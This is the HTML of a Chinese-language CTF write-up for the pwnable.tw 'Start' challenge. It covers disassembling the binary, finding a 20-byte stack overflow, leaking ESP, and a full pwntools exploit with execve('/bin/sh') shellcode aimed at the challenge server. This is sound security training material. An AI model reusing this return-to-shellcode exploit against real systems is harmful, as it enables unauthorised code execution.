@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="RECONchecksec 掃下去：   基本上沒有防護   再來是 disassemble:   1objdump -d start 12345678910111213141516171819202122232425262728293031Disassembly of section .text:08048060 &lt;_start&gt;: 8048060:       54">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Start on Pwnable.tw">
+<meta property="og:url" content="http://wha13.github.io/2024/08/12/pwnable-tw-start/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="RECONchecksec 掃下去：   基本上沒有防護   再來是 disassemble:   1objdump -d start 12345678910111213141516171819202122232425262728293031Disassembly of section .text:08048060 &lt;_start&gt;: 8048060:       54">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hyfs3cDqR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sktf05v9C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1-pGov90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJ0DfjD50.png">
+<meta property="article:published_time" content="2024-08-12T15:00:42.000Z">
+<meta property="article:modified_time" content="2024-08-12T15:01:16.538Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/Hyfs3cDqR.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Start on Pwnable.tw</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/08/12/pwnable-tw-orw/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/08/11/hacker101ctf-bugdb/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/08/12/pwnable-tw-start/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&text=Start on Pwnable.tw"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&is_video=false&description=Start on Pwnable.tw"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Start on Pwnable.tw&body=Check out this article: http://wha13.github.io/2024/08/12/pwnable-tw-start/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&name=Start on Pwnable.tw&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/08/12/pwnable-tw-start/&t=Start on Pwnable.tw"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">1.</span> <span class="toc-text">RECON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Start on Pwnable.tw
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-12T15:00:42.000Z" class="dt-published" itemprop="datePublished">2024-08-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><p>checksec 掃下去：<br><img src="https://hackmd.io/_uploads/Hyfs3cDqR.png" alt="image">  </p>
+<p>基本上沒有防護  </p>
+<p>再來是 disassemble:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d start</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:       54                      push   %esp</span><br><span class="line"> 8048061:       68 9d 80 04 08          push   $0x804809d</span><br><span class="line"> 8048066:       31 c0                   xor    %eax,%eax</span><br><span class="line"> 8048068:       31 db                   xor    %ebx,%ebx</span><br><span class="line"> 804806a:       31 c9                   xor    %ecx,%ecx</span><br><span class="line"> 804806c:       31 d2                   xor    %edx,%edx</span><br><span class="line"> 804806e:       68 43 54 46 3a          push   $0x3a465443</span><br><span class="line"> 8048073:       68 74 68 65 20          push   $0x20656874</span><br><span class="line"> 8048078:       68 61 72 74 20          push   $0x20747261</span><br><span class="line"> 804807d:       68 73 20 73 74          push   $0x74732073</span><br><span class="line"> 8048082:       68 4c 65 74 27          push   $0x2774654c</span><br><span class="line"> 8048087:       89 e1                   mov    %esp,%ecx</span><br><span class="line"> 8048089:       b2 14                   mov    $0x14,%dl</span><br><span class="line"> 804808b:       b3 01                   mov    $0x1,%bl</span><br><span class="line"> 804808d:       b0 04                   mov    $0x4,%al</span><br><span class="line"> 804808f:       cd 80                   int    $0x80</span><br><span class="line"> 8048091:       31 db                   xor    %ebx,%ebx</span><br><span class="line"> 8048093:       b2 3c                   mov    $0x3c,%dl</span><br><span class="line"> 8048095:       b0 03                   mov    $0x3,%al</span><br><span class="line"> 8048097:       cd 80                   int    $0x80</span><br><span class="line"> 8048099:       83 c4 14                add    $0x14,%esp</span><br><span class="line"> 804809c:       c3                      ret</span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:       5c                      pop    %esp</span><br><span class="line"> 804809e:       31 c0                   xor    %eax,%eax</span><br><span class="line"> 80480a0:       40                      inc    %eax</span><br><span class="line"> 80480a1:       cd 80                   int    $0x80</span><br></pre></td></tr></table></figure>
+
+<p>他調用了兩個syscall, 分別是第一個int80<code>0x804808f</code>前的write(把文字輸出)和<code>0x8048097</code>的read(把stdin讀進去)  </p>
+<p>另外，esp+0x14也可以看得出來棧上面大小為20 bytes (或者fuzz看看也可以)<br>註：fuzz <code>echo &#39;aaaaaaaaaaaaaaaaaaa&#39; | ./start</code> 類似這樣</p>
+<p>實際Run一遍：<br><img src="https://hackmd.io/_uploads/Sktf05v9C.png" alt="image">  </p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p><em>quick reminder:</em><br>ebp是棧底的addr, esp是棧頂, eip控制了ret addr  </p>
+<p><em>攻擊流程：</em>  </p>
+<ol>
+<li>蓋掉EIP變成<code>0x8048087</code>，因為這時候會把ESP的值變成ECX的，可以輸出ESP值(很接近ESP地址)  </li>
+<li>這時候拿到ESP地址，可以戳RET2SC的攻擊方法，隨便丟個SHELLCODE出去就好，我是拿 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/47513">這段(link)</a></li>
+</ol>
+<p>*ESP上面的VALUE跟他的地址差4<br><img src="https://hackmd.io/_uploads/S1-pGov90.png" alt="image">  </p>
+<p><strong>exp.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode=<span class="string">b&quot;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="comment"># r=process(&#x27;./start&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">esp=u32(r.recv(<span class="number">4</span>))-<span class="number">4</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+p32(esp+<span class="number">24</span>)+shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/SJ0DfjD50.png" alt="image"><br><strong>PWNED!!</strong></p>
+<p>P.S.坑點：  </p>
+<ul>
+<li>要用send而不是sendline(會多一個字元，i386好像特別嚴格QwQ)</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">1.</span> <span class="toc-text">RECON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/08/12/pwnable-tw-start/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&text=Start on Pwnable.tw"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&is_video=false&description=Start on Pwnable.tw"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Start on Pwnable.tw&body=Check out this article: http://wha13.github.io/2024/08/12/pwnable-tw-start/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&title=Start on Pwnable.tw"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/08/12/pwnable-tw-start/&name=Start on Pwnable.tw&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/08/12/pwnable-tw-start/&t=Start on Pwnable.tw"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
